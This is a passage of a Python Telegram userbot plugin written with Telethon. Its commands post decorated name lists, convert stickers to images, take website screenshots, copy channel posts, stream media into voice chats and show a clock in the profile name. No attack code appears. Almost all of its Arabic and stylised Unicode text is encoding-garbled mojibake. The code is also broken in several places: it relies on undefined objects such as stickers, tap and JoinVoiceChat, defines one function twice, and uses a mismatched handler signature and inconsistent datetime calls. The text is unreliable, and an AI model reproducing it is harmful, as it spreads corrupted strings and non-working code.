        "- ùì£ùìæùìÆùìºùì≠ùì™ùîÇ ‚ú¶\n"
        "- ùì¶ùìÆùì≠ùì∑ùìÆùìºùì≠ùì™ùîÇ ‚ùÅ\n"
        "- ùì£ùì±ùìæùìªùìºùì≠ùì™ùîÇ ‚òæ\n"
        "- ùìïùìªùì≤ùì≠ùì™ùîÇ ‚ù£Ô∏è\n"
        "- ùì¢ùì™ùìΩùìæùìªùì≠ùì™ùîÇ ‚ôï"
    )


@client.on(events.NewMessage(pattern=r"^.ÿßÿ≥ŸÖÿßÿ° ÿπÿ±ÿ®Ÿäÿ©$"))
async def ÿßÿ≥ŸÖÿßÿ°_ÿπÿ±ÿ®Ÿäÿ©(event):
    await event.edit(
        "**‚ú¶ ÿßÿ≥ŸÖÿßÿ° ÿπÿ±ÿ®Ÿäÿ© ŸÖÿ≤ÿÆÿ±ŸÅÿ© ‚ú¶**\n\n"
        "- ŸÖŸÄÿ≠ŸÄŸÖŸÄÿØ ‚ôï\n"
        "- ÿπŸÄŸÑŸÄŸäŸë ‚ôõ\n"
        "- ÿπŸÄŸÖŸÄÿ± ‚úø\n"
        "- ÿπŸÄÿ´ŸÄŸÖŸÄÿßŸÜ ‚ù•\n"
        "- ÿ£ÿ®ŸÄŸà ÿ®ŸÄŸÉŸÄÿ± ‚ô°\n"
        "- ÿÆŸÄÿßŸÑŸÄÿØ ‚úß\n"
        "- ÿ≥ŸÄŸÑŸÄŸÖŸÄÿßŸÜ ‚õß\n"
        "- ŸÅŸÄÿßÿ∑ŸÄŸÖŸÄÿ© ‚ùÄ\n"
        "- ÿπŸÄÿßÿ¶ÿ¥ŸÄÿ© ‚ú∫\n"
        "- ÿ≤ŸäŸÜŸÄÿ® ‚òΩ\n"
        "- ÿ±ŸÇŸÄŸäŸÄÿ© ‚ù£Ô∏è\n"
        "- ÿ£ŸÖ ŸÉŸÄŸÑÿ´ŸÄŸàŸÖ ‚ú¶\n"
        "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n"
        "- ÿ≠ÿ®Ÿäÿ®ÿ© ‚òÖ\n"
        "- ÿ¨ŸÜÿ© ‚ùÅ\n"
        "- ÿ±ŸäŸÄŸÖ ‚åØ\n"
        "- ÿ≥ÿ¨Ÿâ ‚úø\n"
        "- ÿ≥ÿßÿ±ÿ© ‚õß\n"
        "- ÿØÿπÿßÿ° ‚ú•\n"
        "- ÿ¥ŸáÿØ ‚ú¶\n"
        "- ŸÜÿØŸâ ‚òæ\n"
        "- ÿ±ŸÜÿß ‚ù£Ô∏è"
    )


@client.on(events.NewMessage(pattern=r"^.ÿ®ŸÜÿßÿ™1$"))
async def ÿ®ŸÜÿßÿ™1(event):
    await event.edit(
        "**‚ú¶ ÿßÿ≥ŸÖÿßÿ° ÿ®ŸÜÿßÿ™ ŸÖÿ≤ÿÆÿ±ŸÅÿ© ‚ú¶**\n\n"
        "- ùíúùìàùìÇùí∂ùìÄ ü©µ\n"
        "- ùíúùìÇùí∂ùìÅ üå∑\n"
        "- ùí•ùëúùìéùí∂ üå∏\n"
        "- ùíÆùí∂ùìáùí∂ üåº\n"
        "- ùí©ùí∂ùìÉùí∂ üí´\n"
        "- ùí©ùëúùìáùí∂ ‚ú®\n"
        "- ùëÄùëúùìÉùí∂ ü™ª\n"
        "- ùêªùëúùìÉùëíùìé üíõ\n"
        "- ùêøùíæùìÉùí∂ ü©∑\n"
        "- ùêπùí∂ùìáùí∂ùíΩ üïäÔ∏è"
    )


@client.on(events.NewMessage(pattern=r"^.ÿ®ŸÜÿßÿ™2$"))
async def ÿ®ŸÜÿßÿ™2(event):
    await event.edit(
        "**‚ú¶ ÿßÿ≥ŸÖÿßÿ° ÿ®ŸÜÿßÿ™ ŸÖÿ≤ÿÆÿ±ŸÅÿ© ÿ•ÿ∂ÿßŸÅŸäÿ© ‚ú¶**\n\n"
        "- ìÜ©ùê¥ùìÇùìÉùí∂ìÜ™ üíï\n"
        "- ìÜ©ùêªùíæùìÉùí∂ìÜ™ üíï\n"
        "- ìÜ©ùí≤ùíæùìÉùìâùëíùìáìÜ™ üíï\n"
        "- ìÜ©ùí¢ùíΩùí∂ùìÉùíæùí∂ìÜ™ üíï\n"
        "- ìÜ©ùí©ùíæùìÉùí∂ìÜ™ üíï\n"
        "- ìÜ©ùíµùíæùìÉùí∂ìÜ™ üíï\n"
        "- ìÜ©ùêøùí∂ùìâùíæùíªùí∂ìÜ™ ü©∑\n"
        "- ìÜ©ùí¥ùí∂ùìàùìÇùíæùìÉìÜ™ ‚ú®\n"
        "- ìÜ©ùíÆùíæùìÅùìãùí∂ìÜ™ üå∏"
    )


@client.on(events.NewMessage(pattern=r"^.ÿ¥ÿ®ÿßÿ®1$"))
async def ÿ¥ÿ®ÿßÿ®1(event):
    await event.edit(
        "**‚ú¶ ÿßÿ≥ŸÖÿßÿ° ÿ¥ÿ®ÿßÿ® ŸÖÿ≤ÿÆÿ±ŸÅÿ© ‚ú¶**\n\n"
        "- ìÜ©ùê¥ùìÅùíæìÜ™ üî•\n"
        "- ìÜ©ùëÄùëúùíΩùí∂ùìÇùìÇùëíùíπìÜ™ üî•\n"
        "- ìÜ©ùí¶ùíΩùí∂ùìÅùíæùíπìÜ™ üî•\n"
        "- ìÜ©ùíÆùí∂ùìÇùíæìÜ™ üî•\n"
        "- ìÜ©ùí•ùëúùìàùëíùíªìÜ™ üî•\n"
        "- ìÜ©ùí≤ùí∂ùìàùíæùìÇìÜ™ üî•\n"
        "- ìÜ©ùêªùìäùìàùìàùí∂ùíæùìÉìÜ™ üî•\n"
        "- ìÜ©ùëÄùí∂ùìÅùíæùìÄìÜ™ ‚ú¶\n"
        "- ìÜ©ùëÄùëúùìÉùíæùìáìÜ™ ‚úß"
    )

@client.on(events.NewMessage(pattern=r"^.ÿ¥ÿ®ÿßÿ®2$"))
async def ÿ¥ÿ®ÿßÿ®2(event):
    await event.edit(
        "**‚ú¶ ÿßÿ≥ŸÖÿßÿ° ÿ¥ÿ®ÿßÿ® ŸÖÿ≤ÿÆÿ±ŸÅÿ© ÿ•ÿ∂ÿßŸÅŸäÿ© ‚ú¶**\n\n"
        "- ‚¶ÖùêÄùêáùêåùêÄùêÉ‚¶Ü ‚ö°Ô∏è\n"
        "- ‚¶ÖùêëùêÄùêåùêò‚¶Ü ‚ö°Ô∏è\n"
        "- ‚¶ÖùêåùêÄùêâùêÉ‚¶Ü ‚ö°Ô∏è\n"
        "- ‚¶ÖùêåùêÄùêçùêíùêéùêîùêë‚¶Ü ‚ö°Ô∏è\n"
        "- ‚¶ÖùêÄùêòùêåùêÄùêç‚¶Ü ‚ö°Ô∏è\n"
        "- ‚¶ÖùêáùêÄùêíùêáùêàùêå‚¶Ü ‚ö°Ô∏è\n"
        "- ‚¶ÖùêÅùêÄùêíùêÑùêÑùêå‚¶Ü ‚ö°Ô∏è\n"
        "- ‚¶ÖùêíùêáùêÄùêáùêÑùêÑùêë‚¶Ü ‚ö°Ô∏è\n"
        "- ‚¶ÖùêìùêÄùêëùêÑùêä‚¶Ü ‚ö°Ô∏è"
    )
    

TEMP_DOWNLOAD_DIRECTORY = "./temp"
if not os.path.isdir(TEMP_DOWNLOAD_DIRECTORY):
    os.makedirs(TEMP_DOWNLOAD_DIRECTORY)

@client.on(events.NewMessage(pattern=".ÿ≠ŸàŸÑ ŸÑÿµŸàÿ±Ÿá$"))
async def to_photo(event):
    if not event.reply_to_msg_id:
        await event.edit("**‚åî‚àÆ ÿ®ÿßŸÑŸÄÿ±ÿØ ÔÆºÿè ŸÖŸÑÿµŸÄŸÇ . . .**")
        return
    
    reply_message = await event.get_reply_message()
    filename = os.path.join(TEMP_DOWNLOAD_DIRECTORY, "converted.jpg")

    await event.edit("**‚åî‚àÆ ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ**")
    downloaded_file_name = await event.client.download_media(reply_message, filename)

    if os.path.exists(downloaded_file_name):
        await event.client.send_file(
            event.chat_id, downloaded_file_name, force_document=False, reply_to=event.reply_to_msg_id
        )
        os.remove(downloaded_file_name)
        await event.delete()
    else:
        await event.edit("**‚åî‚àÆ ŸÅÿ¥ŸÑ ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ**")


@client.on(events.NewMessage(pattern=".ÿ≠ŸàŸÑ ŸÑŸÖŸÑÿµŸÇ$"))
async def to_sticker(event):
    if not event.reply_to_msg_id:
        await event.edit("**‚åî‚àÆ ÿ®ÿßŸÑŸÄÿ±ÿØ ÔÆºÿè ÿµŸÄŸàÿ±ÿ© . . .**")
        return

    reply_message = await event.get_reply_message()
    filename = os.path.join(TEMP_DOWNLOAD_DIRECTORY, "converted.webp")

    await event.edit("**‚åî‚àÆ ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ**")
    downloaded_file_name = await event.client.download_media(reply_message, filename)

    if os.path.exists(downloaded_file_name):
        await event.client.send_file(
            event.chat_id, downloaded_file_name, force_document=False, reply_to=event.reply_to_msg_id
        )
        os.remove(downloaded_file_name)
        await event.delete()
    else:
        await event.edit("**‚åî‚àÆ ŸÅÿ¥ŸÑ ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ**")

plugin_category = "ÿßŸÑÿ®ÿ≠ÿ´"

@client.on(events.NewMessage(pattern=r"^\.ÿ±ŸäŸÖÿßŸÉÿ≥ ([\s\S]*)"))
async def remaxzedthon(event):
    ok = event.pattern_match.group(1)
    if not ok:
        if event.is_reply:
            what = (await event.get_reply_message()).message
        else:
            await event.edit("`Ÿäÿ±ÿ¨Ÿâ ÿ•ÿØÿÆÿßŸÑ ŸÉŸÑŸÖÿ© ŸÑŸÑÿ®ÿ≠ÿ´ ÿπŸÜ ÿßŸÑÿ±ŸäŸÖŸÉÿ≥..!`")
            return
    await stickers[0].click(
        event.chat_id,
        reply_to=event.reply_to_msg_id,
        silent=True if event.is_reply else False,
        hide_via=True
    )
    await event.delete()

@client.on(events.NewMessage(pattern=r"^\.ÿ±ŸäŸÖŸÉÿ≥ ([\s\S]*)"))
async def zed(event):
    if event.fwd_from:
        return
    zedr = event.pattern_match.group(1)
    
    if event.reply_to_msg_id:
        await event.get_reply_message()
    
    await tap[0].click(event.chat_id)
    await event.delete()
    
import traceback
plugin_category = "ÿßŸÑÿπÿ±Ÿàÿ∂"

@client.on(events.NewMessage(pattern=r"^.(ÿ≥ŸÉÿ±ŸäŸÜ|ss) (.+)$"))
async def take_screenshot(client, event):
    "ÿØÿßŸÑÿ© ŸÑÿ£ÿÆÿ∞ ŸÑŸÇÿ∑ÿ© ÿ¥ÿßÿ¥ÿ© ŸÑŸÖŸàŸÇÿπ ŸÖÿπŸäŸÜ"
    if Config.CHROME_BIN is None:
        return await event.reply("Ÿäÿ¨ÿ® ÿ™ÿ´ÿ®Ÿäÿ™ Google Chrome. ÿßŸÑÿπŸÖŸÑŸäÿ© ÿ™ŸàŸÇŸÅÿ™.")

    mode, url_input = event.pattern_match.groups()
    zzevent = await event.reply("**- ÿ¨ŸÄÿßÿ±Ÿê ÿßÿÆŸÄÿ∞ ŸÑŸÇÿ∑ŸÄÿ© ÿ¥ÿßÿ¥ŸÄŸá ŸÑŸÑÿµŸÅÿ≠ŸÄŸá...**")
    start = datetime.datetime.now()

    try:
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument("--ignore-certificate-errors")
        chrome_options.add_argument("--test-type")
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.binary_location = Config.CHROME_BIN

        await event.edit("**- ÿ¨ŸÄÿßÿ±Ÿê ÿßŸÑÿßÿ™ÿµŸÄÿßŸÑ ÿ®ÿ¨ŸÄŸàÿ¨ŸÑ ŸÉŸÄÿ±ŸàŸÖ ...**")
        driver = webdriver.Chrome(options=chrome_options)

        if mode == "ÿ≥ŸÉÿ±ŸäŸÜ":
            if not url_input.startswith("http"):
                url_input = f"http://{url_input}"
        elif mode == "ss":
            url_input = f"https://www.google.com/search?q={url_input}"

        driver.get(url_input)
        await event.edit("**- ÿ¨ŸÄÿßÿ±Ÿê ÿ±ŸÅŸÄÿπ ŸÑŸÇÿ∑ŸÄÿ© ÿ¥ÿßÿ¥ŸÄŸá ŸÑŸÑÿµŸÅÿ≠ŸÄŸá...**")

        height = driver.execute_script("return document.body.scrollHeight")
        width = driver.execute_script("return document.body.scrollWidth")
        driver.set_window_size(width + 100, height + 100)
        im_png = driver.get_screenshot_as_png()

        await event.edit("**- ÿ™ŸÖ ÿ•ÿ∫ŸÄŸÑÿßŸÇ ÿ¨Ÿàÿ¨ŸÄŸÑ ŸÉŸÄÿ±ŸàŸÖ ‚úì**")
        driver.quit()

        end = datetime.datetime.now()
        ms = (end - start).seconds
        caption = f"**‚éâ‚ïéÿßŸÑŸÖŸÄŸàŸÇÿπ : **{url_input} \n**‚éâ‚ïé ÿßŸÑŸàŸÇÿ™ ÿßŸÑŸÖÿ≥ÿ™ÿ∫ŸÄÿ±ŸÇ : {ms} ÿ´ÿßŸÜŸäŸÄŸá**\n**‚éâ‚ïéÿ™ŸÖ ÿßÿÆŸÄÿ∞ ŸÑŸÇÿ∑ŸÄÿ© ÿ¥ÿßÿ¥ŸÄŸá .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚úì**"

        await zzevent.delete()
        with io.BytesIO(im_png) as out_file:
            out_file.name = "screenshot.png"
            await client.send_file(event.chat_id, out_file, caption=caption, force_document=True)

    except Exception:
        await zzevent.edit(f"`{traceback.format_exc()}`")


@client.on(events.NewMessage(pattern=r"^.ŸÑŸÇÿ∑Ÿá (.+)$"))
async def screenshot_api(client, event):
    "ÿØÿßŸÑÿ© ŸÑÿ£ÿÆÿ∞ ŸÑŸÇÿ∑ÿ© ÿ¥ÿßÿ¥ÿ© ÿπÿ®ÿ± API"
    if Config.SCREEN_SHOT_LAYER_ACCESS_KEY is None:
        return await event.edit("Ÿäÿ¨ÿ® ÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ŸÖŸÅÿ™ÿßÿ≠ API ŸÖŸÜ https://screenshotlayer.com/product!")

    url_input = event.pattern_match.group(1)
    zzevent = await event.reply("**- ÿ¨ŸÄÿßÿ±Ÿê ÿßÿÆŸÄÿ∞ ŸÑŸÇÿ∑ŸÄÿ© ÿ¥ÿßÿ¥ŸÄŸá ŸÑŸÑÿµŸÅÿ≠ŸÄŸá...**")
    start = datetime.datetime.now()

    if not url_input.startswith("http"):
        url_input = f"http://{url_input}"

    sample_url = f"https://api.screenshotlayer.com/api/capture?access_key={Config.SCREEN_SHOT_LAYER_ACCESS_KEY}&url={url_input}&fullpage=1&viewport=2560x1440&format=PNG&force=1"
    response_api = requests.get(sample_url)

    end = datetime.datetime.now()
    ms = (end - start).seconds
    caption = f"**‚éâ‚ïéÿßŸÑŸÖŸÄŸàŸÇÿπ : **{url_input} \n**‚éâ‚ïé ÿßŸÑŸàŸÇÿ™ ÿßŸÑŸÖÿ≥ÿ™ÿ∫ŸÄÿ±ŸÇ : {ms} ÿ´ÿßŸÜŸäŸÄŸá**\n**‚éâ‚ïéÿ™ŸÖ ÿßÿÆŸÄÿ∞ ŸÑŸÇÿ∑ŸÄÿ© ÿ¥ÿßÿ¥ŸÄŸá .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚úì**"

    if "image" in response_api.headers["content-type"]:
        with io.BytesIO(response_api.content) as screenshot_image:
            screenshot_image.name = "screencapture.png"
            await client.send_file(event.chat_id, screenshot_image, caption=caption, force_document=True)
            await zzevent.delete()
    else:
        await zzevent.edit(f"`{response_api.text}`")

@client.on(events.NewMessage(outgoing=True, pattern=r"^.ŸÜÿ≥ÿÆ (.+)"))
async def copy_channel_messages(event):
    try:

        channel_username = event.pattern_match.group(1)


        async for post in client.iter_messages(channel_username, limit=50):  
            if post.text:
                await event.respond(post.text)
            elif post.photo:
                await event.respond(file=post.photo, message=post.text or "")
            elif post.video:
                await event.respond(file=post.video, message=post.text or "")
            elif post.document:
                await event.respond(file=post.document, message=post.text or "")

        await event.respond("**‚éô ÿ™ŸÖ ŸÜÿ≥ÿÆ ÿßŸÑŸÖŸÜÿ¥Ÿàÿ±ÿßÿ™ ÿ®ŸÜÿ¨ÿßÿ≠!**")
    except Exception as e:
        await event.respond(f"‚ùå **ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£:** `{str(e)}`")

# ÿßŸÑÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿ≠ÿßŸÑÿ© ÿßŸÑŸÖŸÉÿßŸÑŸÖÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ©
async def is_audio_chat_active(chat_id):
    try:
        active_calls = await client(GetActiveCall(channel=chat_id))
        return True if active_calls else False
    except:
        return False

# ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿµŸàÿ™ ÿπŸÜÿØ ÿ™ŸÜŸÅŸäÿ∞ ÿßŸÑÿ£ŸÖÿ±
@client.on(events.NewMessage(outgoing=True, pattern=r'.ÿ¥ÿ∫ŸÑ ÿµŸàÿ™'))
async def AudioFileToVoiceChat(event):
    if event.reply_to != None:
        # ÿßŸÑÿ™ÿ≠ŸÇŸÇ ÿ•ÿ∞ÿß ŸÉÿßŸÜÿ™ ÿßŸÑŸÖŸÉÿßŸÑŸÖÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ© ŸÇŸäÿØ ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ
        if await is_audio_chat_active(event.chat_id):
            edit = await event.edit('**‚éâ‚ïéÿßŸÑŸÖŸÉÿßŸÑŸÖÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ© ŸÇŸäÿØ ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ ÿ®ÿßŸÑŸÅÿπŸÑ.**')
            return
        
        try:
            from telethon.tl.functions.channels import GetMessagesRequest
            message_media = await event.client(GetMessagesRequest(channel=event.chat_id, id=[event.reply_to.reply_to_msg_id]))
        except:
            from telethon.tl.functions.messages import GetMessagesRequest
            message_media = await event.client(GetMessagesRequest(id=[event.reply_to.reply_to_msg_id]))
            
        try:
            if message_media.messages[0].media != None and str(message_media.messages[0].media.document.mime_type).startswith('audio'):
                edit = await event.edit('**- ÿ¨ŸÄÿßÿ±Ÿê ÿ™ÿ¥ÿ∫ŸäŸÄŸÑ ÿßŸÑŸÖŸÇÿ∑ŸÄŸìŸÄÿπ ÿßŸÑÿµŸÄŸìŸÄŸàÿ™Ÿä ... üéß‚ô•Ô∏è**')
                filename = await event.client.download_media(message_media.messages[0], 'audio')
                
                edit = await event.edit("**- ÿ™ŸÖ ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ üéß‚ô•Ô∏è**")
                try:
                    stream = await JoinThenStreamAudio(f'{event.chat_id}', filename)
                    edit = await event.edit('**‚éâ‚ïéÿ™ŸÖ .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠‚òëÔ∏è**')
                except Exception as error:
                    print (error)
                    edit = await event.edit('**‚éâ‚ïéÿßŸÑÿ®ÿ´ ÿ¨ÿßÿ±Ÿä, ÿßÿ∞ÿß ŸÑŸÖ Ÿäÿ®ÿØÿ£ ÿßŸàŸÇŸÅ ÿßŸÑÿ®ÿ´ Ÿà ÿ≠ÿßŸàŸÑ ŸÖÿ±ÿ© ÿßÿÆÿ±Ÿâ**')
            else:
                edit = await event.edit('**‚éâ‚ïéŸäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿµŸàÿ™Ÿäÿ©**')
                
        except Exception as error:
            edit = await event.edit('**‚éâ‚ïéŸäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿµŸàÿ™Ÿäÿ©**')
    else:
        edit = await event.edit('**‚éâ‚ïéŸäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿµŸàÿ™Ÿäÿ©**')


# ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑŸÅŸäÿØŸäŸà ÿπŸÜÿØ ÿ™ŸÜŸÅŸäÿ∞ ÿßŸÑÿ£ŸÖÿ±
@client.on(events.NewMessage(outgoing=True, pattern=r'.ÿ¥ÿ∫ŸÑ ŸÅŸäÿØŸäŸà'))
async def VideoFileToVoiceChat(event):
    if event.reply_to != None:
        # ÿßŸÑÿ™ÿ≠ŸÇŸÇ ÿ•ÿ∞ÿß ŸÉÿßŸÜÿ™ ÿßŸÑŸÖŸÉÿßŸÑŸÖÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ© ŸÇŸäÿØ ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ
        if await is_audio_chat_active(event.chat_id):
            edit = await event.edit('**‚éâ‚ïéÿßŸÑŸÖŸÉÿßŸÑŸÖÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ© ŸÇŸäÿØ ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ ÿ®ÿßŸÑŸÅÿπŸÑ.**')
            return
        
        try:
            from telethon.tl.functions.channels import GetMessagesRequest
            message_media = await event.client(GetMessagesRequest(channel=event.chat_id, id=[event.reply_to.reply_to_msg_id]))
        except:
            from telethon.tl.functions.messages import GetMessagesRequest
            message_media = await event.client(GetMessagesRequest(id=[event.reply_to.reply_to_msg_id]))
            
        try:
            if message_media.messages[0].media != None and str(message_media.messages[0].media.document.mime_type).startswith('video'):
                edit = await event.edit('**- ÿ¨ŸÄÿßÿ±Ÿê ÿ™ÿ¥ÿ∫ŸäŸÄŸÑ ŸÖŸÇÿ∑ŸÄŸìŸÄÿπ ÿßŸÑŸÅŸäŸÄŸìŸÄÿØŸäŸà ... üéß‚ô•Ô∏è**')
                filename = await event.client.download_media(message_media.messages[0], 'video')
                
                edit = await event.edit("**- ÿ™ŸÖ ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ üéß‚ô•Ô∏è\n\n- ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥ : @source_flex**")
                try:
                    stream = await JoinThenStreamVideo(f'{event.chat_id}', filename)
                    edit = await event.edit('**‚éâ‚ïéÿ™ŸÖ .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠‚òëÔ∏è**')
                except Exception as error:
                    print (error)
                    edit = await event.edit('**‚éâ‚ïéÿßŸÑÿ®ÿ´ ÿ¨ÿßÿ±Ÿä, ÿßÿ∞ÿß ŸÑŸÖ Ÿäÿ®ÿØÿ£ ÿßŸàŸÇŸÅ ÿßŸÑÿ®ÿ´ Ÿà ÿ≠ÿßŸàŸÑ ŸÖÿ±ÿ© ÿßÿÆÿ±Ÿâ**')
            else:
                edit = await event.edit('**‚éâ‚ïéŸäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÅŸäÿØŸäŸà**')
                
        except Exception as error:
            edit = await event.edit('**‚éâ‚ïéŸäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÅŸäÿØŸäŸà**')
    else:
        edit = await event.edit('**‚éâ‚ïéŸäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÅŸäÿØŸäŸà**')
        

# ÿßŸÑÿ™ÿ≠ŸÇŸÇ ÿ•ÿ∞ÿß ŸÉÿßŸÜÿ™ ÿßŸÑŸÖŸÉÿßŸÑŸÖÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ© ŸÇŸäÿØ ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ
async def is_audio_chat_active(chat_id):
    try:
        # ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿ£ŸÜ ÿßŸÑÿØÿ±ÿØÿ¥ÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ© ŸÖŸÅÿ™Ÿàÿ≠ÿ©
        chat_info = await client(GetChannelRequest(chat_id))
        if chat_info.full_chat and chat_info.full_chat.broadcast:
            return True
        return False
    except Exception as e:
        print(f"Error checking audio chat: {e}")
        return False

# ÿ®ÿØÿ° ŸÖŸÉÿßŸÑŸÖÿ© ÿµŸàÿ™Ÿäÿ© ÿ•ÿ∞ÿß ŸÑŸÖ ÿ™ŸÉŸÜ ŸÇŸäÿØ ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ
@client.on(events.NewMessage(outgoing=True, pattern=r'.ÿßÿ®ÿØÿ£ ŸÖŸÉÿßŸÑŸÖÿ©'))
async def start_audio_call(event):
    if await is_audio_chat_active(event.chat_id):
        edit = await event.edit("**‚éâ‚ïéÿßŸÑŸÖŸÉÿßŸÑŸÖÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ© ŸÇŸäÿØ ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ ÿ®ÿßŸÑŸÅÿπŸÑ.**")
        return
    
    try:
        # ÿ®ÿØÿ° ÿßŸÑŸÖŸÉÿßŸÑŸÖÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ© (ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿ•ŸÑŸâ ÿßŸÑÿØÿ±ÿØÿ¥ÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ©)
        await client(JoinVoiceChat(channel=event.chat_id))
        edit = await event.edit('**‚éâ‚ïéÿ™ŸÖ ŸÅÿ™ÿ≠ ÿßŸÑŸÖŸÉÿßŸÑŸÖÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ© ÿ®ŸÜÿ¨ÿßÿ≠.**')
    except ChannelPrivateError:
        edit = await event.edit("**‚éâ‚ïéŸÑÿß ŸäŸÖŸÉŸÜ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿ•ŸÑŸâ ÿßŸÑÿØÿ±ÿØÿ¥ÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ©ÿå ÿ±ÿ®ŸÖÿß ÿ™ŸÉŸàŸÜ ÿÆÿßÿµÿ©.**")
    except Exception as e:
        edit = await event.edit(f"**‚éâ‚ïéÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}**")

update_tasks = {}
time_formts = {
    "1": "ùüèùüêùüëùüíùüìùüîùüïùüñùüóùüé",
    "2": "ùü∑ùü∏ùüπùü∫ùüªùüºùüΩùüæùüøùü∂",
    "3": "ùü£ùü§ùü•ùü¶ùüßùü®ùü©ùü™ùü´ùü¢",
    "4": "ùü≠ùüÆùüØùü∞ùü±ùü≤ùü≥ùü¥ùüµùü¨",
    "5": "ùü∑ùü∏ùüπùü∫ùüªùüºùüΩùüæùüøùü∂",
    "6": "€±€≤€≥€¥€µ€∂€∑€∏€π€∞",
    "7": "Ÿ°Ÿ¢Ÿ£Ÿ§Ÿ•Ÿ¶ŸßŸ®Ÿ©Ÿ†",
    "8": "‚ÇÅ‚ÇÇ‚ÇÉ‚ÇÑ‚ÇÖ‚ÇÜ‚Çá‚Çà‚Çâ‚ÇÄ",
    "9": "‚ìµ‚ì∂‚ì∑‚ì∏‚ìπ‚ì∫‚ìª‚ìº‚ìΩ‚ì™",
    "10": "ùüôùüöùüõùüúùüùùüûùüüùü†ùü°ùüò",
    "11": "‚ù∂‚ù∑‚ù∏‚ùπ‚ù∫‚ùª‚ùº‚ùΩ‚ùæ‚ìø"
}

current_time_format = "1"

async def update_name_periodically(event, user_name, timezone_str): 
    chat_id = event.chat_id
    timezone = pytz.timezone(timezone_str)  
    await event.delete() 
    while True:
        now = datetime.now(timezone)
        formatted_time = now.strftime('%I:%M')
        original_chars = "1234567890"
        formatted_chars = time_formts[current_time_format]
        for i in range(len(original_chars)):
            formatted_time = formatted_time.replace(original_chars[i], formatted_chars[i])
        try:
            await event.client(UpdateProfileRequest(last_name=formatted_time)) 
        except Exception as ex:
            print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(ex)}")
        await asyncio.sleep(55)
        if chat_id in update_tasks and not update_tasks[chat_id]:
            break

@client.on(events.NewMessage(pattern=r"\.ÿßÿ≥ŸÖŸä \| (.+)", outgoing=True))
async def change_name_with_time(event):
    timezone_str = event.pattern_match.group(1) 
    chat_id = event.chat_id
    update_tasks[chat_id] = True
    me = await client.get_me()
    user_name = me.first_name
    asyncio.ensure_future(update_name_periodically(event, user_name, timezone_str))

@client.on(events.NewMessage(pattern=r"\.ÿßŸäŸÇÿßŸÅ ÿßÿ≥ŸÖŸä$", outgoing=True))
async def stop_name_update(event):
    chat_id = event.chat_id
    if chat_id in update_tasks:
        update_tasks[chat_id] = False
        try:
            await event.client(UpdateProfileRequest(last_name="")) 
        except Exception as ex:
            print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(ex)}")
        await event.delete() 

@client.on(events.NewMessage(pattern=r"\.ÿßŸÑÿßÿ¥ŸÉÿßŸÑ$", outgoing=True))
async def show_time_formts(event):
    formats_text = "\n".join([f"{key}: {value}" for key, value in time_formts.items()])
    await event.respond(f"**ŸÇÿßÿ¶ŸÖÿ© ÿ£ÿ¥ŸÉÿßŸÑ ÿßŸÑŸàŸÇÿ™:**\n\n{formats_text}")
    await event.delete()

@client.on(events.NewMessage(pattern=r"\.ÿßŸÑÿ¥ŸÉŸÑ (\d+)", outgoing=True))
async def change_time_format(event):
    global current_time_format
    try:
        format_key = event.pattern_match.group(1)
        if format_key in time_formts:
            current_time_format = format_key
